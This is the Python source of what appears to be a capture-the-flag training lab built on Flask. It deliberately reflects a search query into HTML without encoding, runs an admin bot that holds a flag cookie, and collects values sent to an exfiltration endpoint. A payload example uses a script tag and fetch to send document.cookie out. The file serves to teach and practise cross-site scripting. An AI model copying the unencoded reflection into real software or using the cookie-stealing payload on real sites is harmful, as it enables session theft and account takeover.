from __future__ import annotations

from urllib.parse import unquote

from flask import request

from labkit import Lab

lab = Lab("SCOUT SEARCH", accent="#e05252")
app = lab.app

CAPTURED: list[str] = []


def shell(title: str, body: str) -> object:
    return lab.page(title, f'<div class="hero"><div class="kicker">SCOUT // KNOWLEDGE SEARCH</div><h1>{title}</h1></div>{body}', nav='<a href="/">Search</a><a href="/report">Bot preview</a><a href="/captured">Captured data</a>')


@app.route("/", methods=["GET", "POST"])
def index():
    q = request.values.get("q", "")
    results = ""
    if q:
        # VULNERABLE: the query is reflected into HTML without encoding.
        results = f'<div class="panel"><h2>Results for {q}</h2><p>No indexed documents matched, but your query was rendered by the template.</p></div>'
    return shell(
        "Search the field manual",
        f"""<div class="panel"><form method="get"><label>Query</label><input name="q" value="{q}" placeholder="supply chain">
        <p><button type="submit">Search</button></p></form></div>{results}
        <p class="note">The admin bot has an active session cookie while it reviews reported queries. It never returns page content to you.</p>""",
    )


@app.route("/report", methods=["GET", "POST"])
def report():
    message = ""
    if request.method == "POST":
        path = request.form.get("path", "/").strip()
        if not path.startswith("/") or "://" in path:
            message = '<div class="flash err">Submit a local path beginning with `/`.</div>'
        else:
            result = lab.bot(path, cookies=[{"name": "admin_session", "value": lab.flag("flag")}], wait=2.0)
            message = f'<div class="flash {"ok" if result.get("ok") else "err"}">Bot visit: {result.get("ok") and "completed" or result.get("error", "failed")}</div>'
    return shell(
        "Admin bot preview",
        f"""<div class="panel"><h2>Escalate a query</h2><p>Paste the local path the bot should open. The bot holds a readable administrative cookie.</p>
        <form method="post"><label>Path</label><input name="path" value="/?q=test" size="80">
        <p><button type="submit">Send bot</button></p></form>{message}
        <p class="note">Payload example: <code>/?q=&lt;script&gt;fetch('/collect?c='+encodeURIComponent(document.cookie))&lt;/script&gt;</code></p></div>""",
    )


@app.route("/collect")
def collect():
    value = request.args.get("c", "") or request.get_data(as_text=True)
    if value:
        CAPTURED.append(value[:2000])
        if lab.flag("flag") in value:
            lab.objective_async("flag", "admin cookie exfiltrated through reflected XSS")
    return ("", 204)


@app.get("/captured")
def captured():
    rows = "".join(f"<li><code>{value}</code></li>" for value in CAPTURED) or '<li class="dim">Nothing captured yet.</li>'
    return shell("Captured data", f'<div class="panel"><h2>Exfiltration collector</h2><ul class="list">{rows}</ul></div>')


if __name__ == "__main__":
    lab.run()
